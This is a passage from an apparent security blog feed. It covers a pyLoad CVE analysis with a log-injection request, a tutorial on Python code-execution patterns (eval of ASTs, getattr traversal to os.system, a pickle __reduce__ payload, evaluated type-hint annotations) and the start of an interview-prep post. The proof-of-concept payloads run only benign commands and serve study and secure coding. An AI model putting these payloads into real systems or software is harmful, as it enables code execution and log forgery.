</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Login failed for user &#39;</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span></code></pre></div><p>A login attempt can be made using a request like</p>
<pre tabindex="0"><code>http://localhost:8000/login?next=http://localhost:8000/&#39; -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; --data-raw $&#39;do=login&amp;username=user&amp;password=password&amp;submit=Login&#39;
</code></pre><p>The value sent as the <code>username</code> parameter is logged as-is without any sanitization. Therefore, an attacker can craft a <code>username</code> param with newlines (and log string format) and inject a log. A malicious request has been provided by the reporter in the advisory</p>
<pre tabindex="0"><code>http://localhost:8000/login?next=http://localhost:8000/&#39; -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; --data-raw $&#39;do=login&amp;username=wrong\&#39;%0a[2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED&amp;password=wrong&amp;submit=Login&#39;
</code></pre><p>This will insert a log like</p>
<pre tabindex="0"><code>2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED
</code></pre><h3 id="fix-3">Fix</h3>
<p>This issue is fixed by <a href="https://github.com/pyload/pyload/commit/4159a1191ec4fe6d927e57a9c4bb8f54e16c381d">this PR</a>.</p>
<p>The fix is to sanitize the value of the username paramater to remove newlines and carriage returns.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span> api <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>current_app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;PYLOAD_API&#34;</span>]
</span></span><span style="display:flex;"><span>user_info <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>check_auth(user, password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sanitized_user <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user_info:
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Login failed for user &#39;</span><span style="color:#e6db74">{</span>sanitized_user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify(<span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><hr>
<p>I enjoyed analyzing these CVEs and fixes. I especially found the <code>urlparse</code> issue in CVE-2024-24808 very interesting, since I was not aware of the described behavior of <code>urlparse</code>. As a side effect of analyzing these CVEs, I also learnt a few things about Flask internals. I&rsquo;m still hunting my first CVE, and studying these advisories has taught me lots of useful techniques, tips, and tricks for my search. Hopefully, I will find the CVE soon. If not, there&rsquo;s plenty of CVEs to analyze and learn from!</p>
]]></content>
        </item>
        
        <item>
            <title>Exploring Python Code Execution Patterns for Fun and Profit</title>
            <link>http://localhost:1313/posts/python-rce/</link>
            <pubDate>Sun, 17 Mar 2024 10:01:34 -0800</pubDate>
            
            <guid>http://localhost:1313/posts/python-rce/</guid>
            <description>&lt;p&gt;Recently, I was looking at the Semgrep output for an open source project and I saw an interesting finding about potential arbitrary code execution. The code essentially ran an &lt;code&gt;eval&lt;/code&gt; but the interesting part was converting Python code to an abstract syntax tree, compiling it to bytecode, and evaluating it. This made me curious about other unsafe ways to write Python code that could lead to code execution. In this article, I will discuss a few patterns that I learnt about through my limited research.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Recently, I was looking at the Semgrep output for an open source project and I saw an interesting finding about potential arbitrary code execution. The code essentially ran an <code>eval</code> but the interesting part was converting Python code to an abstract syntax tree, compiling it to bytecode, and evaluating it. This made me curious about other unsafe ways to write Python code that could lead to code execution. In this article, I will discuss a few patterns that I learnt about through my limited research.</p>
<p>Notes:</p>
<ul>
<li>This is by no means a complete list of all patterns that can lead to arbitrary code execution in Python.</li>
<li>Some of these examples are contrived, and might not make any sense in the real world. I merely use them to demonstrate vulnerable code patterns.</li>
</ul>
<h2 id="basic-patterns">Basic Patterns</h2>
<p>Python provides many ways of running system commands or arbitrary code in its <code>os</code> and <code>subprocess</code> modules. Some examples include:</p>
<ul>
<li><a href="https://docs.python.org/3/library/os.html"><code>os.system</code>, <code>os.popen</code>, <code>os.execve</code></a></li>
<li><a href="https://docs.python.org/3/library/subprocess.html"><code>subprocess.Popen</code>, <code>subprocess.run</code>, <code>subprocess.check_call</code>, <code>subprocess.check_output</code></a></li>
</ul>
<p>While <code>subprocess</code> functions are designed to be safer than <code>os</code> functions, allowing code execution via untrusted input should always be avoided. Some examples of untrusted inputs leading to remote code execution can be seen in <a href="https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/">these vulnerabilities</a> reported against Roxy-WI. Here, user input is directly concatenated to commands used in calls to <code>os.system</code>, <code>subprocess.Popen</code> and <code>ssh.exec_command</code>.</p>
<p>It is also possible to run arbitrary Python code using <a href="https://docs.python.org/3/library/functions.html#eval"><code>eval</code></a> and <a href="https://docs.python.org/3/library/functions.html#exec"><code>exec</code></a>.</p>
<h2 id="eval-and-exec-with-abstract-syntax-trees"><code>eval</code> and <code>exec</code> with Abstract Syntax Trees</h2>
<p><code>eval</code> and <code>exec</code> require a string, bytes or code object. There is also <a href="https://docs.python.org/3/library/functions.html#compile"><code>compile</code></a> which can compile code into bytecode. The compiled bytecode can then be used with <code>eval</code> or <code>exec</code>. However <code>compile</code> requires a string, bytes or AST object. Therefore, just by themselves one cannot <code>eval</code> or <code>exec</code> a function like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>eval(my_function)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">TypeError</span>: eval arg <span style="color:#ae81ff">1</span> must be a string, bytes <span style="color:#f92672">or</span> code object
</span></span></code></pre></div><p>Although I can&rsquo;t think of any good reasons for evaluating a function like this, someone might have some use case. They can then convert the function to an AST first, compile it to bytecode, and evaluate or execute it as needed. If a malicious user can control what function is being evaluated or executed, they will achieve code execution.</p>
<h3 id="code-example">Code example</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">eval_node</span>(func):
</span></span><span style="display:flex;"><span>    tree <span style="color:#f92672">=</span> ast<span style="color:#f92672">.</span>parse(textwrap<span style="color:#f92672">.</span>dedent(inspect<span style="color:#f92672">.</span>getsource(func)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> node <span style="color:#f92672">in</span> ast<span style="color:#f92672">.</span>walk(tree):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(node, ast<span style="color:#f92672">.</span>Call):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> eval(compile(ast<span style="color:#f92672">.</span>Expression(node), <span style="color:#e6db74">&#34;fl&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_function</span>():
</span></span><span style="display:flex;"><span>    subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#34;id&#34;</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(eval_node(my_function))
</span></span></code></pre></div><p>Here, <code>my_function</code> is parsed into an AST, which is then compiled to bytecode before being evaluated.</p>
<h2 id="recursive-attribute-lookup">Recursive attribute lookup</h2>
<p>I learnt about this pattern while reading a <a href="https://snyk.io/blog/python-rce-vulnerability/">CVE report for Celery</a> by Calum Hutton. I would highly recommend reading the original article, but I will summarize the finding here.</p>
<p>Python allows performing recursive lookups on objects to get their attributes or sub-attributes. This means it is possible to traverse from one module to another, and use functions present in the other module, if the first module imports the subsequent module(s). This also means if an application exposes functionality that allows user controlled object traversal, the user might be able to manipulate the traversal and get references to functions such as <code>os.system</code>, therefore acheiving arbitrary code execution. (I am using <code>os.system</code> as example, but this would apply to something like <code>subprocess.run</code> too.)</p>
<p>Not every module imports the <code>os</code> module, so this pattern only affects modules import <code>os</code> and thus have <code>os</code> as an attribute . Some examples of such modules are:</p>
<ul>
<li><a href="https://github.com/python/cpython/blob/main/Lib/random.py#L62"><code>random</code></a> (<code>os</code> is imported as <code>_os</code>)</li>
<li><a href="https://github.com/python/cpython/blob/main/Lib/shutil.py#L7"><code>shutil</code></a></li>
<li><a href="https://github.com/python/cpython/blob/main/Lib/pathlib/__init__.py#L10"><code>pathlib</code></a></li>
<li><a href="https://github.com/python/cpython/blob/main/Lib/posixpath.py#L25"><code>posixpath</code></a></li>
</ul>
<p>If you are interested in finding more modules, you can look at the Python <a href="https://github.com/python/cpython/tree/main/Lib">sourcecode</a> where the modules are defined and check if the module imports <code>os</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>getattr(pathlib, <span style="color:#e6db74">&#34;os&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getattr(shutil, <span style="color:#e6db74">&#34;os&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getattr(random, <span style="color:#e6db74">&#34;_os&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getattr(posixpath, <span style="color:#e6db74">&#34;os&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><h3 id="code-example-1">Code example</h3>
<p>This snippet is adapted from Celery source code presented in the original article.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">code_exec</span>(d):
</span></span><span style="display:flex;"><span>    _module <span style="color:#f92672">=</span> d[<span style="color:#e6db74">&#34;module&#34;</span>]
</span></span><span style="display:flex;"><span>    _type <span style="color:#f92672">=</span> d[<span style="color:#e6db74">&#34;type&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        cls <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>modules[_module]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> _type<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>):
</span></span><span style="display:flex;"><span>            cls <span style="color:#f92672">=</span> getattr(cls, name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    _msg <span style="color:#f92672">=</span> d[<span style="color:#e6db74">&#34;message&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(_msg, (tuple, list)):
</span></span><span style="display:flex;"><span>            d <span style="color:#f92672">=</span> cls(<span style="color:#f92672">*</span>_msg)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            d <span style="color:#f92672">=</span> cls(_msg)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;module&#34;</span>: <span style="color:#e6db74">&#34;os&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;system&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;id&#34;</span>,
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The above snippet will lead to running <code>os.system(&quot;id&quot;)</code>. First <code>cls</code> is instantiated as <code>os</code> using <code>sys.modules</code>. It is then updated to the <code>os.system</code> function via recursive lookup using <code>getattr</code>. Finally code is executed when <code>cls(_msg)</code> is evaluated.</p>
<h3 id="cve-2023-33733">CVE-2023-33733</h3>
<p>CVE-2023-3373 is a CVE in the <code>reportlab</code> Python library. This was reported by Elyas Damej, who has published a great <a href="https://github.com/c53elyas/CVE-2023-33733">write-up</a> describing the vulnerabilties and its technical details. This is a very interesting CVE since it combines recursive attribute lookup and using <code>eval</code> to execute arbitrary code.</p>
<p>I would recommend reading the original write-up, but I&rsquo;ll summarize it here. The <code>reportlab</code> library allows creating PDFs using Python. In 2019, a <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17626">CVE</a> was discovered which allowed remote code execution through the <code>color</code> HTML tag which is passed to <code>eval</code> without proper sanitization. To fix this  <code>rl_safe_eval</code> sandbox was implemented where all Python builtins functions are removed and many builtin functions are overriden to prevent access to dangerous functions that could lead to code execution. This sandbox was bypassed by creating a new class <code>Word</code> which is specifically crafted to bypass the checks in the sandbox. Following this, the <code>__globals__</code> attribute of <code>Word</code> is accessed and used to call <code>os.system</code></p>
<h2 id="pickle">Pickle</h2>
<p>In Python, the <code>pickle</code> module is used for serializing and deserializing objects. Serialization refers to the process of converting objects in memory to a byte stream. Deserialization is the reverse process, where the byte stream is converted back into objects in memory. Serialization is performed by <code>pickle.dump</code> / <code>pickle.dumps</code> and deserialization is performed by <code>pickle.load / pickle.loads</code>.</p>
<p>Python allows specifying how an object should be pickled by using the <code>__reduce__</code> method. The <code>__reduce__</code> function can return a tuple which represents callable code along with arguments to the callable code. When this object is deserialized, Python will run the callable code in the object&rsquo;s <code>__reduce__</code> method. This gives one the ability to create an object that can lead to code execution when deserialized.</p>
<h3 id="code-example-2">Code example</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Payload</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;whoami&#39;</span>,))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>serialized <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(Payload())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>loads(serialized)
</span></span></code></pre></div><p>When an object of the class <code>Payload</code> is deserialized using <code>pickle.loads()</code>, the <code>__reduce__</code> function is called. This function returns callable code <code>os.system('whoami')</code>, which is then executed.</p>
<p>This behavior of <code>pickle</code> has led to many CVEs. Some examples:</p>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23930">CVE-2023-23930</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-34668">CVE-2022-34668</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33026">CVE-2021-33026</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-22083">CVE-2020-22083</a></li>
</ul>
<h2 id="forward-references-and-typingget_type_hints">Forward References and <code>typing.get_type_hints</code></h2>
<p>I learnt of this technique from a <a href="https://stackoverflow.com/questions/25353753/python-can-i-safely-unpickle-untrusted-data">Stack Overflow</a> post about dangers of unpickling untrusted data.</p>
<p>A forward reference is a reference to a variable, function, or class that is defined later in the code. One place where forward references can be used is with <code>typing.get_type_hints</code>.</p>
<p>From <a href="https://docs.python.org/3/library/typing.html#typing.get_type_hints">documentation</a>: <code>typing.get_type_hints</code> returns a dictionary containing type hints for a function, method, module or class object. In addition, forward references encoded as string literals are handled by evaluating them in globals and locals namespaces.</p>
<p>This behavior can be misused to run arbitrary code, by specifying the code as a forward reference. Setting the <code>__anotations__</code> attribute of an object to such a forward reference does the trick.</p>
<h3 id="code-example-3">Code example</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Payload</span>(object):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>__annotations__ <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;x&#34;</span>: <span style="color:#e6db74">&#34;&#34;&#34;eval(&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)&#34;&#34;&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> Payload()
</span></span><span style="display:flex;"><span>print(typing<span style="color:#f92672">.</span>get_type_hints(p))
</span></span></code></pre></div><p>Here, we specify a forward reference which imports <code>os</code> and calls <code>os.system</code></p>
<p>It is possible that <code>typing.get_type_hints</code> is used internally by other Python functions, which could make these functions also susceptible to similar misuse. The Stack Overflow post mentions <code>functools.singledispatch</code> which has inner function <code>register</code>. The <code>register</code> function calls <code>typing.get_type_hints</code>. In the <code>register</code> function, <code>typing.get_type_hints</code> is used like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>(cls, func<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nonlocal</span> cache_token
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> _is_valid_dispatch_type(cls):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> func <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">lambda</span> f: register(cls, f)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> func <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid first argument to `register()`. &#34;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>cls<span style="color:#e6db74">!r}</span><span style="color:#e6db74"> is not a class or union type.&#34;</span>
</span></span><span style="display:flex;"><span>                )
</span></span><span style="display:flex;"><span>            ann <span style="color:#f92672">=</span> getattr(cls, <span style="color:#e6db74">&#39;__annotate__&#39;</span>, <span style="color:#66d9ef">None</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ann <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid first argument to `register()`: </span><span style="color:#e6db74">{</span>cls<span style="color:#e6db74">!r}</span><span style="color:#e6db74">. &#34;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Use either `@register(some_class)` or plain `@register` &#34;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;on an annotated function.&#34;</span>
</span></span><span style="display:flex;"><span>                )
</span></span><span style="display:flex;"><span>            func <span style="color:#f92672">=</span> cls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># only import typing if annotation parsing is necessary</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> get_type_hints
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">from</span> annotationlib <span style="color:#f92672">import</span> Format, ForwardRef
</span></span><span style="display:flex;"><span>            argname, cls <span style="color:#f92672">=</span> next(iter(get_type_hints(func, format<span style="color:#f92672">=</span>Format<span style="color:#f92672">.</span>FORWARDREF)<span style="color:#f92672">.</span>items()))
</span></span></code></pre></div><p>To reach the <code>get_type_hints</code> call, the function must be registered in such a way that the execution reaches the <code>else</code> block. This happens if we use <code>@register</code> on an annotated function. We can add additional annotations to the function before calling register. If we add annotations like in the example to the function, we can get code execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> singledispatch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_payload</span>(p: <span style="color:#e6db74">&#34;Payload&#34;</span>): <span style="color:#75715e"># annotated function</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Processing Payload: </span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>handle_payload<span style="color:#f92672">.</span>__annotations__ <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;obj&#34;</span>: <span style="color:#e6db74">&#34;&#34;&#34;eval(&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@singledispatch</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process</span>(obj):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Default processing&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>process<span style="color:#f92672">.</span>register(handle_payload)
</span></span></code></pre></div><p>There will be a <code>TypeError: Invalid annotation for 'x'. 0 is not a class</code> when running this, but that happens after the <code>eval</code> is executed (and frankly, executing the <code>eval</code> is what we care about).</p>
<hr>
<p>While researching for this article, I learnt many things about Python internals. I found this quite interesting, and therefore, plan to look more into Python internals - and research other unsafe patterns that could lead to security issues. I also plan to use what I learn to look for security issues in open source code. Only time will tell how successful I am in these endeavors!</p>
<p>Thanks for reading!</p>
]]></content>
        </item>
        
        <item>
            <title>Tales from my Product Security Job Hunt: Part 2, Preparation</title>
            <link>http://localhost:1313/posts/interview-prep/</link>
            <pubDate>Sun, 14 Jan 2024 21:51:34 -0800</pubDate>
            
            <guid>http://localhost:1313/posts/interview-prep/</guid>
            <description>&lt;p&gt;This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews &lt;a href=&#34;https://www.baishya.xyz/posts/types-of-interviews/&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;As I mentioned in my previous post, this is catered to my search criteria, which was:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Experience: Mid-level (~4‚Äì5 years of experience)&lt;/li&gt;
&lt;li&gt;Role: Product Security / Application Security&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Even within the roles I was looking for, different openings had slightly different requirements. For example, an application security role for a team/company that has a large mobile application footprint is likely to involve duties related to securing these applications ‚Äî and therefore, the candidate would be expected to know about mobile application security.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews <a href="https://www.baishya.xyz/posts/types-of-interviews/">here</a></p>
<p>As I mentioned in my previous post, this is catered to my search criteria, which was:</p>
<ul>
<li>Experience: Mid-level (~4‚Äì5 years of experience)</li>
<li>Role: Product Security / Application Security</li>
</ul>
<p>Even within the roles I was looking for, different openings had slightly different requirements. For example, an application security role for a team/company that has a large mobile application footprint is likely to involve duties related to securing these applications ‚Äî and therefore, the candidate would be expected to know about mobile application security.</p>
<p>The responsibilities and therefore the desired skillset also varied with the size/maturity of the company‚Äôs security program. In smaller teams, the responsibilities were broader, whereas in larger teams, the responsibilities were more specialized. I mostly applied to roles with more specialized requirements, based on my interests and skillset. I did explore a few roles that had a broader scope, but since my experience and skills are quite specialized in application/product security, I did not fare well in these interviews ‚Äî and I decided to look for roles where I would be a good fit.</p>
<p>Most of this post will be specific to roles having one or more of the following as the primary responsibilities:</p>
<ul>
<li>Understanding and triaging security issues including root cause analysis.</li>
<li>Threat modeling and/or security reviews including code reviews.</li>
<li>Building tooling/automation to detect application security issues.</li>
</ul>
<h2 id="technical-interviews">Technical Interviews</h2>
<p>Most companies had multiple technical interviews, starting with basic technical questions and continuing to more in-depth or domain-specific questions. I spent most of my preparation time preparing for technical interviews. Having 4 years of experience in application security, and therefore being constantly exposed to topics in this space was a big help. My preparation in this area was mainly divided into:</p>
<ul>
<li>Topics that I do not work with (or rarely work with).</li>
<li>Revising theoretical aspects of topics I worked with practically, e.g. TLS handshake or OAuth grants.</li>
</ul>
<p>I primarily used the following resources:</p>
<ul>
<li>
<p><a href="https://portswigger.net/web-security"><strong>Portswigger Web Security Academy</strong></a>: This is by far my most used resource. The academy has detailed lessons on almost all topics you are likely to come across when applying for the type of roles I was looking at. The academy also has labs, which help in solidifying the theoretical understanding from going through the lessons. I concentrated on OWASP top 10/CWE top 25 and issues that are being discussed on the news/x.</p>
</li>
<li>
<p><a href="https://tib3rius.com/interview-questions"><strong>Web Security Questions by Tib3rius</strong></a>: A great list of questions of all levels of difficulty.</p>
</li>
<li>
<p><strong>News</strong>: I generally read cybersecurity news and this habit helped me with interview prep. I was able to learn about security concepts that are being discussed actively or issues that adversaries are exploiting. I use a few sources for news:</p>
<ul>
<li><a href="https://tldrsec.com/">tl;dr sec newsletter</a></li>
